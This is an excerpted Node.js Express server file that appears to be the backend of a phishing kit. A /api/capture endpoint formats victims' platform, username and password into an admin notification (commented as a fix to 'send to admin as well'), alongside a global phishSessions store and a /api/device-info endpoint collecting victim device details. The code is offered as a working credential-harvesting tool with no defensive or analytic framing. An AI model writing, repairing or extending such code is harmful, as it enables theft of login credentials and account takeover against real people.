...
app.post('/api/device-info', (req, res) => {
    ...
    // Optionally log or forward to admin
...
app.post('/api/capture', async (req, res) => {
    ...
    try {
        ...
        // FIX: Send to admin as well
        const adminMsg = `📸 <b>New Capture</b>\n\n👤 <b>User:</b> <code>${userid}</code>\n📌 <b>Platform:</b> ${platform || 'Unknown'}\n👤 <b>Username:</b> <code>${username}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
...
// Initialize sessions object and cleanup interval
if (!global.phishSessions) global.phishSessions = {};
setInterval(() => {
    const now = Date.now();
    for (const [sid, sess] of Object.entries(global.phishSessions)) {
        // Delete sessions older than 1 hour (3600000 ms)
...
async function startServer() {
    ...
    if (mongoConnected) {
        ...
        app.listen(config.port, () => {
            ...
            console.log('✅ Multer configured and working!');
            console.log('✅ phishSessions cleanup active (1 hour expiry)');
            console.log('✅ /api/device-info endpoint added');
            console.log('✅ Admin notification added to /api/capture');
        });
    } else {
